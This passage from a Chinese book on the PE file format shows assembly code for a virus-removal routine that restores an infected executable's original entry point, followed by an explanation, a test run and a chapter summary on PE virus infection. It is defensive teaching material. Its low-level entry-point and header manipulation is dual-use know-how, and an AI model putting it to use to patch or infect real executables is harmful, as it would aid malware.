          mov esi,lpMemory
          add esi,totalSize
          .while al!=0c3h
             mov al,byte ptr [esi]
             dec esi
          .endw
          sub esi,3  ;获取跳转指令的操作数到@dwTemp
          mov eax,dword ptr [esi]
          mov @dwTemp,eax
         
          invoke wsprintf,addr szBuffer,addr szOut3,eax
          invoke _appendInfo,addr szBuffer

          ;求跳转指令在文件中的位置
          sub esi,lpMemory
          dec esi

          invoke wsprintf,addr szBuffer,addr szOut2,esi
          invoke _appendInfo,addr szBuffer

          ;求该偏移在内存中的RVA值
          invoke _OffsetToRVA,lpMemory,esi

          ;该值加上5个指令字节码
          add eax,5
          add eax,@dwTemp ;求跳转的指令位置，即程序原始入口
          mov dwOldEntryPoint,eax
          invoke wsprintf,addr szBuffer,addr szOut4,eax
          invoke _appendInfo,addr szBuffer

                    


          ;修正函数入口地址
          mov edi,lpDstMemory
          assume edi:ptr IMAGE_DOS_HEADER
          add edi,[edi].e_lfanew    
          assume edi:ptr IMAGE_NT_HEADERS
          mov eax,dwOldEntryPoint
          mov [edi].OptionalHeader.AddressOfEntryPoint,eax

          ;修正SizeOfImage
          ;因为是减少文件大小，这个值就不用修正了

 
          ;将新文件内容写入到c:\bindC.exe
          invoke writeToFile,lpDstMemory,dwNewFileSize
          
          ;处理文件结束
          invoke _appendInfo,addr szFinished

          jmp _ErrorExit
 
_ErrFormat:
          invoke MessageBox,hWinMain,offset szErrFormat,NULL,MB_OK
_ErrorExit:
          pop fs:[0]
          add esp,0ch
          invoke UnmapViewOfFile,lpMemory
        .endif
        invoke CloseHandle,@hMapFile
      .endif
      invoke CloseHandle,@hFile
    .endif
  .endif
@@:        
  ret
_openFile endp
```

------

==以上所列为随书文件chapter23\antiVirPE.asm中的函数`_openFile`的源码。函数代码行18～39把要处理的PE目标文件映射到内存，行49～62计算出原始程序大小存储在变量`dwNewFileSize`中==。==行67～71调用函数`GlobalAlloc`用`dwNewFileSize`大小申请内存空间，行73～75将去掉病毒代码的部分复制到申请的内存空间中==。==行80～141更新了新文件中的一些参数，这些参数主要包括最后一节节表描述的两个字段和程序的入口地址，最后将已经解完毒的内存中的内容写入文件，完成解毒过程==。

## 23.3.6　运行测试

解毒程序的运行界面见图23-1。

![image](https://github.com/YangLuchao/img_host/raw/master/20231101/image.jmw174gure0.jpg)

图　23-1　解毒运行过程

如图所示，针对感染病毒的文件进行解毒的操作不是很复杂。首先，求出新文件大小和病毒代码大小，然后求出原始的程序入口地址，并对相关参数进行修正。图中输出的是与该过程有关的几个主要变量的值。针对本章补丁程序实施的解毒相关文件在参考随书文件目录chapter23\a中。读者可以使用PEComp对比原始记事本程序与去掉病毒代码后的C:\bindE.exe文件，查看两者在PE头部的各字段值的区别，从而进一步认识PE病毒的清除方法。

> 注意　真正的反病毒软件在为感染的EXE文件解毒前要做的事情还有很多，如释放内存中加载的线程、删除注册的系统服务、删除注册表启动项、通盘扫描处理感染病毒的文件、为系统实施加固，等等。
>

# 23.4　小结

==本章首先结合愤怒天使病毒介绍了病毒常用的保护技术，然后详细分析了一个标准的（含可传染、可破坏、可隐藏模块）PE病毒的实现原理，并探讨了如何编写相关的解毒代码==。

==本章重点是了解PE病毒传播过程，病毒的传播实际上就是为感染的目标PE文件打补丁的过程，这个过程在病毒补丁程序中有所展示==。==所谓“以毒攻毒”，只有深入了解了病毒的感染机制、传播机制和隐藏机制，才能够有针对性地使用一些编程技巧，甚至是一些病毒经常使用的技术，更好地去解毒==。